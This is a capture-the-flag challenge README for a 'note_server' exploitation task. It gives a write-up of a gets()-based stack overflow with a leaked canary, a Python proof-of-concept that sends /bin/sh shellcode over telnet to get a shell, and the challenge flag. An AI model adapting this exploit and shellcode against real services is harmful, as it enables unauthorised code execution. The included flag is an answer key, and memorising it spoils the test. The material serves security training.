# note_server

## Category
Exploit

## Estimated difficulty
Medium

## Description
A more complicated buffer overflow protected by a canary that can be easily leaked.
Can be run with:
  sudo docker build -t note_server .
  sudo docker run -d -p "0.0.0.0:3333:9999" -h "note_server" --name="note_server" note_server


## Scenario
We are currently working on a note taking platform and some developer are a bit worried about the security of the product already at this early development phase. They ask you if you could have a look and report them any vulnerability you find.
The service can be found at the following IP on the port PORT.


## Write-up
After reversing and playing with the executable, we find out that the login function is vulnerable to a buffer overflow on the username and password due to the usage of gets.
However when we try to exploit it we receive a `*** stack smashing detected ***` meaning that the function is protected by canaries.

After more digging we find the user and password of the application (admin/admin). There we find multiple entries with one called info.
That entry seems to give us the address of the stack and the canary.
We can use those informations to create our exploit but, since the canary contains a null byte we need to use the password field to write it at the required place.

We can then create our shellcode using all those information for the username and fill the missing "\x00" with the end of password.

## PoC script
```
import telnetlib
from struct import pack
IP = "127.0.0.1"
PORT = 3333

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

t = telnetlib.Telnet(IP, PORT)

t.read_until(b">> ")
t.write(b"1\n")
t.read_until(b": ")
t.write(b"admin\n")
t.read_until(b": ")
t.write(b"admin\n")
t.read_until(b">> ")

t.write(b"3\n")
info = t.read_until(b">> ")
ret = pack("<L", int(info[133:139]+b"B0", 16))
canary = pack("<L", int(info[221:229], 16))

t.write(b"4\n")
t.read_until(b">> ")

user = b"A" * 40+ b"A"+canary[1:] + b"A"*12 + ret + b"\x90"*100 + shellcode
password = b"B" * 20

t.write(b"1\n")
t.read_until(b": ")
t.write(user+b"\n")
t.read_until(b": ")
t.write(password+b"\n")

print("ls:")
t.write(b"ls\n")
print(t.read_some().decode())

print("flag:")
t.write(b"cat flag.txt\n")
print(t.read_some().decode())
```

## Flag
CSC{Canar13s_Ar3nt_h4rd!!}

## Creator
Romain Fontaine

## Creator bio
Cyber security analyst working at the CERT.be. Mostly working in reverse engineering and cryptography.

